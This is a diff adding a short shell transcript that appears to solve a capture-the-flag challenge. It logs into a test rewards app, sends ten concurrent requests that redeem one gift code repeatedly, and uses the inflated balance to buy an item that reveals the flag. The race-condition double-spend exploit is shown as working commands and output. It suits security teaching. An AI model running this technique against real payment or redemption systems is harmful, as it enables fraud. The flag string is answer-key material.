@@ -1,0 +1,13 @@
+$ curl -sS -c cookies -d 'email=employee@nexarewards.test&password=rewards1234' \
+    https://aloof-vagabond-unluckily.ngrok-free.dev/login
+HTTP/2 302 location: /dashboard
+
+$ for i in $(seq 1 10); do
+    curl -sS -b cookies -d 'code=NEXA-RACE-60' \
+      https://aloof-vagabond-unluckily.ngrok-free.dev/redeem &
+  done; wait
+# Balance naik dari $60 menjadi $600 karena race condition.
+
+$ curl -sS -b cookies -d 'item_id=audit-report' \
+    https://aloof-vagabond-unluckily.ngrok-free.dev/store/buy | grep NFX
+NFX{r4c3_c0nd1t10n_g1ft_c4rd_d0ubl3_sp3nd}
